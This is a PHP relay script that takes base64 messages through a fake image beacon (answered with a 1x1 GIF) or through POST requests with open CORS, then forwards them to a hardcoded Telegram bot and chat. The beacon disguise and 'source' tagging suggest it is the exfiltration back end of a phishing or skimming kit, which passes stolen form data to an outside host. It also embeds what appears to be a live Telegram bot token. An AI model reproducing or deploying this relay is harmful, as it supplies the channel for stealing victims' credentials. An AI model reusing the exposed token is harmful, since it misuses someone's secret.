<?php
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Headers: Content-Type");
    header("Access-Control-Allow-Methods: POST, OPTIONS, GET");
    exit(0);
}

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Content-Type");
header("Access-Control-Allow-Methods: POST, GET");

date_default_timezone_set('UTC');

$botToken = '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY';
$chatId   = '1325797388';
$logFile = __DIR__ . '/relay-log.txt';

function log_debug($entry) {
    global $logFile;
    file_put_contents($logFile, "[" . date("Y-m-d H:i:s") . "] $entry\n", FILE_APPEND);
}

// Accept both GET (image beacon) and POST
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $b64 = trim($_GET['m'] ?? '');
    if (!$b64) {
        http_response_code(400);
        log_debug("❌ GET missing 'm' param");
        exit("Missing base64 param");
    }

    $decoded = base64_decode($b64);
    if (!$decoded) {
        http_response_code(400);
        log_debug("❌ GET failed to decode base64");
        exit("Decode failed");
    }

    $finalMessage = $decoded . "\n\n📡 *Relayed From:* `beacon-img`";
    goto send_to_telegram;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $text   = trim($_POST['text'] ?? '');
    $source = trim($_POST['source'] ?? 'unknown');

    if (empty($text)) {
        http_response_code(400);
        log_debug("❌ POST missing text from $source");
        exit("Missing message text.");
    }

    $finalMessage = $text . "\n\n📡 *Relayed From:* `{$source}`";
    goto send_to_telegram;
}

http_response_code(405);
log_debug("❌ Rejected method: " . $_SERVER['REQUEST_METHOD']);
exit("Not allowed");

send_to_telegram:

$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$payload = [
    'chat_id' => $chatId,
    'text'    => $finalMessage,
    'parse_mode' => 'Markdown'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
$error    = curl_error($ch);
curl_close($ch);

if ($response) {
    log_debug("✅ Sent | " . substr($finalMessage, 0, 80) . "...");
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        header("Content-Type: image/gif");
        echo base64_decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7");
    } else {
        echo "OK";
    }
} else {
    log_debug("❌ Failed | cURL Error: $error");
    echo "Fail";
}
?>
